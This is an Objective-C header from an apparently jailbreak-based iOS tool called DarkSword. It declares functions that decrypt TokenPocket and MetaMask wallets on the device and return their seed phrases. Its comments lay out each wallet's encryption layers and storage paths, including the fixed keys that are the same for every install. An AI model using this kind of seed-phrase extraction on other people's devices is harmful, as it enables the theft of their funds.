//
//  DarkSwordWalletDecrypt.h
//  Filza-27 (FilzaApplySandboxExt)
//
//  On-device wallet decryption. Each wallet uses its OWN scheme (they are not
//  interchangeable), so every wallet gets its own entry point:
//
//   TokenPocket (com.global.wallet.ios)  - 4 layers:
//       1. SQLCipher 4   main.sqlite3  (fixed passphrase, not the password)
//       2. AES-256-CBC   Documents/F4SeCyr/<sha256>  (fixed key + IV)
//       3. PBKDF2-SHA256 keystore encryptedKey  (password, rounds from keystore)
//       4. ECIES P-521   wallet.mnemonic (ECDH + X9.63 KDF + AES-GCM)
//
//   MetaMask (io.metamask)               - quick-crypto vault:
//       PBKDF2-SHA512(password, salt, iterations) -> AES-256-CBC + PKCS#7,
//       vault JSON lives in Documents/persistStore/persist-keyringcontroller.
//
//  Only the password-derived steps need the wallet password; the fixed layers
//  use constants identical for every install of the same app version.

#import <Foundation/Foundation.h>

NS_ASSUME_NONNULL_BEGIN

/// Decrypts a TokenPocket wallet and returns the recovered BIP-39 mnemonic.
FOUNDATION_EXPORT NSString * _Nullable DarkSwordTokenPocketDecrypt(NSString *password);

/// Decrypts a MetaMask quick-crypto vault and returns the recovered keyring
/// JSON (contains the seed phrase). Returns nil on failure.
FOUNDATION_EXPORT NSString * _Nullable DarkSwordMetaMaskDecrypt(NSString *password);

NS_ASSUME_NONNULL_END
